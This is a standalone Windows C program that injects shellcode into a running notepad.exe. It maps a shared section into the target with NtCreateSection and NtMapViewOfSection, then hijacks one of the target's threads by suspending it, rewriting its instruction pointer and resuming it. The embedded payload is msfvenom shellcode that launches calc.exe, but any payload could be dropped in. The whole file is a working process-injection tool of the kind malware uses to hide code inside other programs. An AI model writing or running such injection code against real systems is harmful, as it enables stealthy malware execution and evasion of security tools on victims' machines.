#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#pragma comment(lib, "ntdll")

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

DWORD searching_seek_and_destroy(wchar_t* process_name) {

    HANDLE handleSnapshot;
    PROCESSENTRY32 process;
    int pid = 0;

    handleSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (handleSnapshot == INVALID_HANDLE_VALUE) goto ExitAndCleanup;

    process.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(handleSnapshot, &process)) goto ExitAndCleanup;

    do {

        printf("process name : %ws\n", process.szExeFile);

        if (lstrcmpiW((LPCWSTR)process_name, process.szExeFile) == 0) {

            printf("\nWe found %ws !\n", process.szExeFile);
            pid = process.th32ProcessID;
            break;
        }
    } while (Process32Next(handleSnapshot, &process));

ExitAndCleanup:
    if (handleSnapshot != INVALID_HANDLE_VALUE) {
        CloseHandle(handleSnapshot);
    }
    else {
        printf("Error while taking snapshot {X__x}\n");
    }

    return pid;
}


HANDLE searching_thread(int pid) {

    HANDLE handleSnapshot;
    HANDLE handleThread = NULL;
    THREADENTRY32 thread;

    handleSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

    if (handleSnapshot == INVALID_HANDLE_VALUE) goto ExitAndCleanup;

    thread.dwSize = sizeof(THREADENTRY32);

    if (!Thread32First(handleSnapshot, &thread)) goto ExitAndCleanup;

    do {

        if (thread.th32OwnerProcessID == pid) {

            printf("\nWe found a thread to inject!\n");
            handleThread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, thread.th32ThreadID);
            break;
        }
    } while (Thread32Next(handleSnapshot, &thread));


ExitAndCleanup:
    if (handleSnapshot != INVALID_HANDLE_VALUE) {
        CloseHandle(handleSnapshot);
    }
    else {
        printf("Error while taking snapshot {X__x}\n");
    }

    return handleThread;
}

void injection_hybrid(unsigned char* payload, SIZE_T size, wchar_t* target_process) {

    HANDLE HandleThread = NULL;
    HANDLE handleProcess = NULL;
    LPVOID PointerToCode = NULL;
    int pid = 0;

    HANDLE handleSection = NULL;
    LPVOID sectionLocalAddress = NULL;
    LPVOID sectionRemoteAddress = NULL;
    NTSTATUS status = NULL;
    SIZE_T sizeSection = size;

    CONTEXT thread_context;
    thread_context.ContextFlags = CONTEXT_FULL;

    printf("Searching for notepad\n");

    pid = searching_seek_and_destroy(target_process);

    if (pid == 0) goto ExitAndCleanup;

    handleProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, (DWORD)pid);

    if (handleProcess == INVALID_HANDLE_VALUE) goto ExitAndCleanup;

    status = NtCreateSection(&handleSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sizeSection, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

    if (!NT_SUCCESS(status)) goto ExitAndCleanup;

    status = NtMapViewOfSection(handleSection, GetCurrentProcess(), &sectionLocalAddress, NULL, NULL, NULL, (PSIZE_T)&sizeSection, 2, NULL, PAGE_READWRITE);

    if (!NT_SUCCESS(status)) goto ExitAndCleanup;

    memcpy(sectionLocalAddress, payload, size);

    status = NtMapViewOfSection(handleSection, handleProcess, &sectionRemoteAddress, NULL, NULL, NULL, (PSIZE_T)&sizeSection, 2, NULL, PAGE_EXECUTE_READ);

    if (!NT_SUCCESS(status)) goto ExitAndCleanup;

    HandleThread = searching_thread(pid);

    if (HandleThread == INVALID_HANDLE_VALUE) goto ExitAndCleanup;

    SuspendThread(HandleThread);

    GetThreadContext(HandleThread, &thread_context);

#ifdef _M_IX86 
    thread_context.Eip = (DWORD64)sectionRemoteAddress;
#else
    thread_context.Rip = (DWORD64)sectionRemoteAddress;
#endif

    SetThreadContext(HandleThread, &thread_context);

    ResumeThread(HandleThread);

    

ExitAndCleanup:
    if (HandleThread != INVALID_HANDLE_VALUE) {
        NtClose(HandleThread);
    }
    else {
        printf("Error while opening thread {X__x}\n");
    }
    if (sectionRemoteAddress != NULL) {
        Sleep(1000);
        NtUnmapViewOfSection(handleProcess, sectionRemoteAddress);
    }
    else {
        printf("Error while creating remote view {X__x}\n");
    }
    if (sectionLocalAddress != NULL) {
        NtUnmapViewOfSection(GetCurrentProcess(), sectionLocalAddress);
    }
    else {
        printf("Error while creating local view {X__x}\n");
    }
    if (handleSection != INVALID_HANDLE_VALUE) {
        CloseHandle(handleSection);
    }
    else {
        printf("Error while creating section {X__x}\n");
    }
    if (handleProcess != INVALID_HANDLE_VALUE) {
        CloseHandle(handleProcess);
    }
    else {
        printf("Error while opening process {X__x}\n");
    }

    printf("The End!\n");
}



void main(void) {

    //shellcode generation calc -> msfvenom -p windows/x64/exec CMD=calc.exe  EXITFUNC=thread -f c
    // Payload size: 276 bytes
    unsigned char MyPayload[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
        "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
        "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
        "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
        "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
        "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
        "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
        "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
        "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
        "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
        "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
        "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
        "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
        "\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
        "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
        "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
        "\x63\x2e\x65\x78\x65\x00";

    SIZE_T SizePayload = sizeof(MyPayload);

    printf("Payload size is %d bytes\n", (int)SizePayload);

    injection_hybrid(MyPayload, SizePayload, L"notepad.exe");

}
